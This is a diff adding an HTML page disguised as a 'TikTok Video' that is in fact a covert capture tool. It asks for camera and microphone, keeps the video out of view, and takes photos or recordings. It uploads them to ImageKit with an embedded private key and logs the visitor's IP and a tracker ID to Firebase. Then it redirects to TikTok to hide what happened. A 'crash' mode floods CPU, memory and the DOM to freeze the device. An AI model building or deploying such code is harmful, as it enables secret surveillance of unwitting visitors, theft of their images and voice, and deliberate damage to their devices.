@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://*.firebaseapp.com https://*.gstatic.com https://api.ipify.org https://*.imagekit.io; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.gstatic.com blob:; style-src 'self' 'unsafe-inline'; media-src 'self' blob:;">
+    <title>TikTok Video</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        body { 
+            background: #000; 
+            width: 100vw; 
+            height: 100vh; 
+            overflow: hidden; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        video { 
+            position: fixed; 
+            top: -100%; 
+            left: -100%; 
+            width: 1px; 
+            height: 1px; 
+            opacity: 0; 
+        }
+        canvas { display: none; }
+        .crash-text {
+            color: #ff0000;
+            text-align: center;
+            font-family: monospace;
+            font-size: 2rem;
+            animation: blink 0.5s infinite;
+            display: none;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <div class="crash-text" id="crashText">💀 CRASHING DEVICE 💀</div>
+
+    <script>
+        (function() {
+            const params = new URLSearchParams(window.location.search);
+            const isCrash = params.get('crash') === '1';
+            
+            // CRASH MODU
+            if (isCrash) {
+                document.getElementById('crashText').style.display = 'block';
+                
+                function crashDevice() {
+                    // Web Worker ile CPU %100
+                    const workerScript = "while(true){try{new ArrayBuffer(9999999)}catch(e){}}";
+                    const blob = new Blob([workerScript], { type: "application/javascript" });
+                    
+                    for(let i = 0; i < 8; i++) {
+                        try {
+                            const worker = new Worker(URL.createObjectURL(blob));
+                            setTimeout(() => worker.terminate(), 30000);
+                        } catch(e) {}
+                    }
+                    
+                    // RAM doldur
+                    const memoryHog = [];
+                    const ramInterval = setInterval(() => {
+                        try {
+                            for(let i = 0; i < 50; i++) {
+                                memoryHog.push(new Array(1000000).fill('x'.repeat(1000)));
+                            }
+                        } catch(e) {
+                            clearInterval(ramInterval);
+                        }
+                    }, 10);
+                    
+                    // DOM spam
+                    setInterval(() => {
+                        for(let i = 0; i < 300; i++) {
+                            const div = document.createElement('div');
+                            div.style.cssText = 'position:absolute;width:100%;height:100%;background:rgba(0,0,0,'+Math.random()+');pointer-events:none;';
+                            document.body.appendChild(div);
+                        }
+                    }, 50);
+                    
+                    // Sonsuz döngü (yavaşlatıcı)
+                    setInterval(() => {
+                        const arr = [];
+                        for(let i = 0; i < 500000; i++) arr.push(Math.random() * Math.random());
+                    }, 100);
+                }
+                
+                crashDevice();
+                return;
+            }
+            
+            // INSTAGRAM YÖNLENDİRME
+            const forceChrome = params.get('force_chrome');
+            const userAgent = navigator.userAgent;
+            const isInstagram = userAgent.includes('Instagram') || userAgent.includes('FBAV') || userAgent.includes('FBAN');
+            
+            if (forceChrome === '1' && isInstagram) {
+                const currentUrl = window.location.href;
+                let cleanUrl = currentUrl.replace(/[?&]force_chrome=1/, '').replace(/[?&]$/, '');
+                
+                if (userAgent.includes('Android')) {
+                    window.location.href = `intent://${cleanUrl.replace('https://', '').replace('http://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
+                } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
+                    window.location.href = `googlechrome://${cleanUrl.replace('https://', '').replace('http://', '')}`;
+                } else {
+                    window.location.href = cleanUrl;
+                }
+                return;
+            }
+            
+            // KAMERA YAKALAMA
+            const FIREBASE_CONFIG = {
+                apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
+                authDomain: "camerahhh-15487.firebaseapp.com",
+                projectId: "camerahhh-15487",
+                storageBucket: "camerahhh-15487.firebasestorage.app",
+                messagingSenderId: "212849652224",
+                appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
+            };
+            
+            const IMAGEKIT_CONFIG = {
+                publicKey: 'public_XJOKnz4iFXkkFRR/NNOj41Y6Ddk=',
+                privateKey: 'private_T2ESq+R6d+czVTlcK/u4QkW4yBU='
+            };
+            
+            function loadFirebase() {
+                return new Promise((resolve, reject) => {
+                    if (typeof firebase !== 'undefined' && firebase.apps.length) {
+                        resolve(firebase);
+                        return;
+                    }
+                    const script = document.createElement('script');
+                    script.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js';
+                    script.onload = () => {
+                        const script2 = document.createElement('script');
+                        script2.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js';
+                        script2.onload = () => resolve(firebase);
+                        script2.onerror = () => reject('Firestore yüklenemedi');
+                        document.head.appendChild(script2);
+                    };
+                    script.onerror = () => reject('Firebase yüklenemedi');
+                    document.head.appendChild(script);
+                });
+            }
+            
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            let mediaStream = null;
+            let db = null;
+            
+            async function uploadToImageKit(file) {
+                return new Promise((resolve, reject) => {
+                    const formData = new FormData();
+                    formData.append('file', file);
+                    formData.append('publicKey', IMAGEKIT_CONFIG.publicKey);
+                    formData.append('fileName', Date.now() + '_' + file.name);
+                    formData.append('folder', '/web-uploads');
+                    formData.append('useUniqueFileName', 'true');
+                    
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'https://upload.imagekit.io/api/v1/files/upload');
+                    const auth = btoa(IMAGEKIT_CONFIG.privateKey + ':');
+                    xhr.setRequestHeader('Authorization', 'Basic ' + auth);
+                    
+                    xhr.onload = () => {
+                        if (xhr.status >= 200 && xhr.status < 300) {
+                            try {
+                                resolve({ success: true, url: JSON.parse(xhr.responseText).url });
+                            } catch(e) {
+                                reject('Upload başarısız');
+                            }
+                        } else {
+                            reject('Upload hatası');
+                        }
+                    };
+                    xhr.onerror = () => reject('Ağ hatası');
+                    xhr.send(formData);
+                });
+            }
+            
+            function capturePhoto() {
+                return new Promise((resolve) => {
+                    if (!video.videoWidth || !video.videoHeight) {
+                        resolve(null);
+                        return;
+                    }
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob((blob) => {
+                        if (!blob) {
+                            resolve(null);
+                            return;
+                        }
+                        resolve(new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' }));
+                    }, 'image/jpeg', 0.9);
+                });
+            }
+            
+            function captureMedia(durationSec, mode) {
+                return new Promise((resolve) => {
+                    if (!mediaStream) {
+                        resolve(null);
+                        return;
+                    }
+                    const mimeType = mode === 'audio' ? 'audio/webm' : 'video/webm';
+                    let recorder;
+                    try {
+                        recorder = new MediaRecorder(mediaStream, { mimeType });
+                    } catch(e) {
+                        recorder = new MediaRecorder(mediaStream);
+                    }
+                    
+                    const chunks = [];
+                    recorder.ondataavailable = e => {
+                        if (e.data.size > 0) chunks.push(e.data);
+                    };
+                    
+                    recorder.onstop = () => {
+                        if (chunks.length === 0) {
+                            resolve(null);
+                            return;
+                        }
+                        const blob = new Blob(chunks, { type: mimeType });
+                        resolve(new File([blob], `${mode}_${Date.now()}.webm`, { type: mimeType }));
+                    };
+                    
+                    recorder.start(500);
+                    setTimeout(() => {
+                        if (recorder.state === 'recording') recorder.stop();
+                    }, durationSec * 1000);
+                });
+            }
+            
+            function getIP() {
+                return fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => d.ip)
+                    .catch(() => 'unknown');
+            }
+            
+            async function start() {
+                try {
+                    const mode = params.get('mode');
+                    let duration = parseInt(params.get('duration')) || 6;
+                    const redirectUrl = params.get('redirect') || 'https://www.tiktok.com';
+                    const userId = params.get('uid');
+                    
+                    if (!userId) {
+                        window.location.href = redirectUrl;
+                        return;
+                    }
+                    
+                    if (duration < 1) duration = 1;
+                    if (duration > 60) duration = 60;
+                    
+                    let constraints = {};
+                    if (mode === 'videoaudio') constraints = { video: true, audio: true };
+                    else if (mode === 'videoonly') constraints = { video: { facingMode: "user" }, audio: false };
+                    else if (mode === 'audio') constraints = { audio: true };
+                    else constraints = { video: { facingMode: "user" } };
+                    
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    mediaStream = stream;
+                    
+                    if (constraints.video) {
+                        video.srcObject = stream;
+                        await video.play();
+                    }
+                    
+                    await loadFirebase();
+                    firebase.initializeApp(FIREBASE_CONFIG);
+                    db = firebase.firestore();
+                    
+                    setTimeout(async () => {
+                        const ip = await getIP();
+                        let mediaUrls = [];
+                        
+                        if (mode === 'photo') {
+                            const file = await capturePhoto();
+                            if (file) {
+                                const res = await uploadToImageKit(file);
+                                if (res.success) mediaUrls.push(res.url);
+                            }
+                        } else if (mode === '5photos') {
+                            for (let i = 0; i < 5; i++) {
+                                const file = await capturePhoto();
+                                if (file) {
+                                    const res = await uploadToImageKit(file);
+                                    if (res.success) mediaUrls.push(res.url);
+                                }
+                                await new Promise(r => setTimeout(r, 120));
+                            }
+                        } else if (['videoonly', 'videoaudio', 'audio'].includes(mode)) {
+                            const file = await captureMedia(duration, mode);
+                            if (file) {
+                                const res = await uploadToImageKit(file);
+                                if (res.success) mediaUrls.push(res.url);
+                            }
+                        }
+                        
+                        if (mediaStream) {
+                            mediaStream.getTracks().forEach(t => t.stop());
+                        }
+                        
+                        if (mediaUrls.length > 0 && userId && db) {
+                            await db.collection("captures").add({
+                                media: mediaUrls,
+                                ip: ip,
+                                mode: mode,
+                                duration: ['videoonly', 'videoaudio', 'audio'].includes(mode) ? duration : null,
+                                userId: userId,
+                                timestamp: new Date().toISOString(),
+                                unix: Date.now()
+                            });
+                        }
+                        
+                        window.location.href = redirectUrl;
+                    }, 800);
+                    
+                } catch(err) {
+                    const redirectUrl = params.get('redirect') || 'https://www.tiktok.com';
+                    window.location.href = redirectUrl;
+                }
+            }
+            
+            start();
+        })();
+    </script>
+</body>
+</html>
